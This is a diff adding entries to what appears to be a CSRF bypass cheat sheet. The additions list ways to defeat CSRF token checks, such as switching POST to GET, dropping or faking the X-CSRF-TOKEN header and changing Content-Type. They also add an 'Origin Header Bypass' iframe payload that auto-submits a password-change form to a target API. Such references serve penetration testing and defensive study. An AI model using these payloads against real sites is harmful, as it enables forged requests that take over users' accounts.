@@ -44,3 +44,16 @@ Use meta tag name="referrer" content="no-referre" in html code.
 ```
 Change from POST to GET and remove X-CSRF-TOKEN
 ```
+```
+Every POST/PUT/PATCH request is protected by X-CSRF-TOKEN.
+
+- Changed POST -> GET
+- Remove X-CSRF-TOKEN
+- Change CSRF token value "true" or "1"
+- Change Content-Type to application/json;charset=UTF-8
+```
+
+### Origin Header Bypass
+```
+<iframe src='data:text/html,<body onload="document.forms[0].submit()"><form action="//example.com/api/auth?password=newpass" method="post"></body>'></iframe>
+```
